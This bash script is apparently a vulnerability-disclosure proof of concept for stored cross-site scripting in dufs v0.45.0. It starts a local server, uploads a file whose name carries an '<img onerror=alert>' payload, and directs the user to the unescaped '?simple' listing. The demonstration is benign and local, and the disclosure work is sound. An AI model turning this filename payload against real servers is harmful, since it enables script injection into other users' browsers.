#!/bin/bash
set -e

# PoC: Stored XSS via unescaped filename in ?simple output
# Tested: dufs v0.45.0
# Affected: Unknown (requires vendor confirmation)
# Vulnerability: When ?simple query parameter is used, filenames are returned without HTML escaping with Content-Type: text/html, allowing stored XSS 
# Execution condition: The project root must be the current directory.

ROOT_DIR="/tmp/dufs-poc-$$/root"
PORT=15555
payload="<img src=x onerror=alert(\"XSS-Successful\")>"
evil_file="$payload.txt"

# Cleanup function to remove temp files and kill server
cleanup() {
    echo "[*] Cleaning up..."
    rm -rf "$ROOT_DIR"
    pkill -f "dufs.*$PORT" 2>/dev/null || true
    sleep 1
}
trap cleanup EXIT

# Step 1: Setup environment
echo "[*] Step 1: Setup environment"
rm -rf "$ROOT_DIR"
mkdir -p "$ROOT_DIR"
# end Step 1

# Step 2: Start dufs server with allow_upload=true
echo "[*] Step 2: Start dufs server (allow_upload=true)"
# Get the dufs binary path (prefer release)
DUFS_BIN=$(find ./target -maxdepth 3 -type f -executable -name dufs \
    \( -path "*/release/*" -o -path "*/debug/*" \) 2>/dev/null | sort -r | head -1)

if [ -z "$DUFS_BIN" ]; then
    echo "Error: dufs binary not found. Run 'cargo build' first." >&2
    exit 1
fi
echo "Using binary: $DUFS_BIN"

# launch background dufs and log output
# --allow-symlink defaults to false
$DUFS_BIN "$ROOT_DIR" --allow-upload --port $PORT --log-file /tmp/dufs-poc-$$.log > /dev/null 2>&1 &
DUFS_PID=$!
echo "    dufs started with PID $DUFS_PID on port $PORT"

sleep 2

# Verify server is running
if ! kill -0 $DUFS_PID 2>/dev/null; then
    echo "[!] ERROR: dufs failed to start"
    exit 1
fi

encoded_file=$(python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read().strip()))" <<< "$evil_file")

# Step 3: Upload payload file
echo "[*] Step 3: Upload payload file"
echo "Uploading payload file to dufs server..."
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
    "http://127.0.0.1:$PORT/$encoded_file" \
    -H "Content-Type: text/plain")
echo "    HTTP Status: $HTTP_STATUS"
echo ""


# Step 4: Verify upload (200 OK or 201 Created)
if [ "$HTTP_STATUS" -ne 200 ] && [ "$HTTP_STATUS" -ne 201 ]; then
    echo "[!] ERROR: File upload failed with status $HTTP_STATUS"
    exit 1
fi

# Step 5: Access the uploaded file (Manual verification via browser is required)
echo "To verify the XSS payload, open the following URL in a web browser:"
echo "http://127.0.0.1:$PORT/?simple"

read -p "Press [Enter] to stop the server and clean up..."
echo "[*] Stopping dufs server..."
sleep 1
